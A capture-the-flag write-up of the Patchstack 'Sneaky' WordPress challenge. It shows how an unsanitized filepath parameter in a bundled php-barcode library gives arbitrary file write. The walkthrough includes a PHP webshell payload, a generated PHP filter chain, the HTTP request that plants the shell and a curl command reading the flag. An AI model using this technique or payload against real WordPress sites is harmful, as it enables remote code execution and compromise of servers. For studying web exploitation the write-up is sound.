# Sneaky

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 5 solves / 964 points
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

You sneaky ...

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250226191039.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Sneaky/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sneaky)-[2025.02.26|19:13:03(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sneaky)-[2025.02.26|19:13:05(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
  inflating: server-given/.DS_Store  
  [...]
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the other challenges, we should first take a look at the `server-given/docker/wordpress/toolbox/Makefile` file:

```bash
[...]
$(WP_CLI) plugin activate mwb-point-of-sale-pos-for-woocommerce
$(WP_CLI) plugin install matomo --activate
$(WP_CLI) plugin install koko-analytics --activate
[...]
@chmod -R 755 /var/www/html/wp-content/uploads
```

In here, the WordPress site is installed with 3 plugins, which are `mwb-point-of-sale-pos-for-woocommerce`, `matomo`, and `koko-analytics`. It also set the directory `/var/www/html/wp-content/uploads/`'s permission to be writable.

After a quick look of plugin `mwb-point-of-sale-pos-for-woocommerce`'s source code, we can see that it has registered lots of AJAX actions. Most of them are unauthenticated.

Although later turns out those AJAX actions have nothing to do with solving this challenge, some of them are quite interesting.

For instance, in method `mwb_pos_update_manager_profile` in class `Pos_For_Woocommerce_Public`, we can see that if we provide a nonce for action `mwb-pos-operarions`, we can update any existing user's information:

```php
class Pos_For_Woocommerce_Public {
    [...]
    public function mwb_pos_update_manager_profile() {
        check_ajax_referer( 'mwb-pos-operarions', 'security' );
        $user_id = isset( $_POST['manager_key'] ) ? explode( '-', map_deep( wp_unslash( $_POST['manager_key'] ), 'sanitize_text_field' ) ) : '';

        if ( is_array( $user_id ) && isset( $user_id[1] ) && '' !== $user_id[1] ) {
            $current_user_id       = $user_id[1];
            $managers_updated_data = isset( $_POST['manager_data'] ) ? map_deep( wp_unslash( $_POST['manager_data'] ), 'sanitize_text_field' ) : array();
            if ( is_array( $managers_updated_data ) && ! empty( $managers_updated_data ) ) {
                $manager_update                  = array();
                $manager_update['ID']            = $current_user_id;
                $manager_update['user_email']    = isset( $managers_updated_data['mwb-pos-manager-email'] ) ? $managers_updated_data['mwb-pos-manager-email'] : '';
                $manager_update['user_nicename'] = isset( $managers_updated_data['mwb-pos-manager-nickName'] ) ? $managers_updated_data['mwb-pos-manager-nickName'] : '';
                $manager_update['first_name']    = isset( $managers_updated_data['mwb-pos-manager-fname'] ) ? $managers_updated_data['mwb-pos-manager-fname'] : '';
                $manager_update['last_name']     = isset( $managers_updated_data['mwb-pos-manager-lname'] ) ? $managers_updated_data['mwb-pos-manager-lname'] : '';

                wp_update_user( $manager_update );
                [...]
            }
        }
        wp_die();
    }
```

In this method, although it doesn't have a way to update the user's password, we can still update the user's email to our attacker controlled email, thus effectively escalating our privilege to that user by resetting its password.

However, the challenge's WordPress site didn't configure email related settings:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250226192908.png)

Also, this plugin is actually **not activated**. This because this plugin requires plugin `woocommerce` to be installed in order to use this plugin. If we install plugin `mwb-point-of-sale-pos-for-woocommerce` and try to activate it, we'll meet with this error message:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250226193121.png)

Hmm... So, does that mean this challenge requires us to find 0 day vulnerabilities in plugin `matomo` and/or `koko-analytics`?! Well, nope.

In the challenge's title, it's called "Sneaky". Does that imply plugin `mwb-point-of-sale-pos-for-woocommerce` has a secret backdoor??

After searching different files in the plugin, we can find this PHP barcode library called [php-barcode](https://github.com/davidscotttufts/php-barcode/tree/master) at path `wp-content/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php`. As the library name suggested, it's a barcode generator written in PHP.

At the first galance, we can already see some dangerous coding pattern in this library:

```php
[...]
$filepath = isset( $_GET['filepath'] ) ? $_GET['filepath']  : '';
$text = isset( $_GET['text'] ) ? $_GET['text']  : '0';
$size = isset( $_GET['size'] ) ? $_GET['size']  : '20';
$orientation = isset( $_GET['orientation'] ) ? $_GET['orientation']  : 'horizontal';
$code_type = isset( $_GET['codetype'] ) ? $_GET['codetype']  : 'code128';
$print = isset( $_GET['print'] ) && ( 'true' == $_GET['print'] )  ? true : false;
$sizefactor = isset( $_GET['sizefactor'] ) ? $_GET['sizefactor'] : '1';

barcode( $filepath, $text, $size , $orientation , $code_type , $print , $sizefactor );
[...]
function barcode( $filepath = '', $text = '0', $size = '20', $orientation = 'horizontal', $code_type = 'code128', $print = false, $size_factor = 1 ) {
    [...]
    // Draw barcode to the screen or save in a file.
    if ( '' == $filepath ) {
        header( 'Content-type: image/png' );
        imagepng( $image );
        imagedestroy( $image );
    } else {
        imagepng( $image, $filepath );
        imagedestroy( $image );
    }
}
```

As you can see, we can see that this `barcode` function will call PHP function [`imagepng`](https://www.php.net/manual/en/function.imagepng.php), which **outputs a PNG image to either the browser or a file**. In here, if `$filepath` (GET parameter `filepath`) is not falsy (Loose comparison `==`) like an empty string, it'll write the PNG image into the given path.

With that said, this library basically gives us the ability to **write arbitrary files**, as the `$filepath` is not sanitized and validated at all! This means we should be able to write arbitrary PHP files into the file system, right? Well, yes. But we also need to somehow control its content.

Hmm... Can we control that? But PHP function `imagepng` outputs a PNG image, and the GD PHP library will strip out all the EXIF metadata, like comment. After researching, we can find this Synacktiv blog post: [Persistent PHP payloads in PNGs: How to inject PHP code in an image – and keep it there !](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there). In that blog post, it talked about how we can inject PHP code into a PNG image, while the image will still have the injected PHP code after processed by the GD library. 

This gives me an idea. Although we can't upload a PNG image, maybe we can somehow generate a PNG image with PHP code in it?

According to [PNG specification](http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Summary-of-standard-chunks), the IHDR chunk has 4 bytes for the image width and 4 bytes for the image height. Since we can control the size of the PNG image via GET parameter `size` and `sizefactor`, maybe we can craft a very short PHP webshell using those bytes in the width and height field?

Unfortunately, the shortest PHP webshell is 15 bytes long, which well exceed the 8 bytes limit:

```php
<?=`$_GET[0]`;
```

Hmm... Is there any other approach?

Since we can control function `imagepng`'s output file path, maybe we can leverage PHP filter chain to inject our own PHP code?

```php
function barcode( $filepath = '', $text = '0', $size = '20', $orientation = 'horizontal', $code_type = 'code128', $print = false, $size_factor = 1 ) {
    [...]
    // Draw barcode to the screen or save in a file.
    if ( '' == $filepath ) {
        [...]
    } else {
        imagepng( $image, $filepath );
        imagedestroy( $image );
    }
}
```

## Exploitation

Armed with above information, we can use [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) developed by Synackti. We can use this tool to generate a PHP filter chain that converts some of the raw bytes data in the PNG image into our own PHP code:

```shell
┌[siunam♥Mercury]-(/opt/php_filter_chain_generator)-[2025.02.26|20:10:22(HKT)]-[git://main ✔]
└> ./php_filter_chain_generator.py --chain 'AAAAAAA<?php system($_GET["cmd"]); ?>'
[+] The following gadget chain will generate the following code : AAAAAAA<?php system($_GET["cmd"]); ?> (base64 value: QUFBQUFBQTw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|[...]|convert.base64-decode/resource=php://temp
```

> Note: Those A's in the front are padding characters. Otherwise, the `<` character will be converted into a different character.

Also, since we want our injected PNG image file is writing to the file system, not into the temporary file (`php://temp`), we need to change the PHP filter chain to have a `write` parameter, and change the `resource` parameter's value to a directory that we want to write into.

Hmm... Which directory should we use? If you remember correctly, directory `/var/www/html/wp-content/uploads` is set to be writable in the `Makefile`:

```bash
[...]
@chmod -R 755 /var/www/html/wp-content/uploads
```

So, we'll need to write the file into that directory.

Therefore, the final filter chain should be like this:

```
php://filter/write=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|[...]|convert.base64-decode/resource=/var/www/html/wp-content/uploads/webshell.php
```

If we send the following GET request, the injected PHP code should be written into directory `/var/www/html/wp-content/uploads/webshell.php`:

```http
GET /wp-content/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php?filepath=php://filter/write=convert.iconv.UTF8.CSISO2022KR|[...]|convert.base64-decode/resource=/var/www/html/wp-content/uploads/webshell.php HTTP/1.1
Host: 52.77.81.199:9108


```

Which we can finally get the flag via our webshell!

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Sneaky)-[2025.02.26|20:27:18(HKT)]
└> curl -s --get http://52.77.81.199:9108/wp-content/uploads/webshell.php --data-urlencode 'cmd=cat /flag*.txt'
AAAAAAACTF{you_sneaky_arent_you_9b44dfdf81200}
```

- **Flag: `CTF{you_sneaky_arent_you_9b44dfdf81200}`**

## Conclusion

What we've learned:

1. Arbitrary file write via PHP filter chain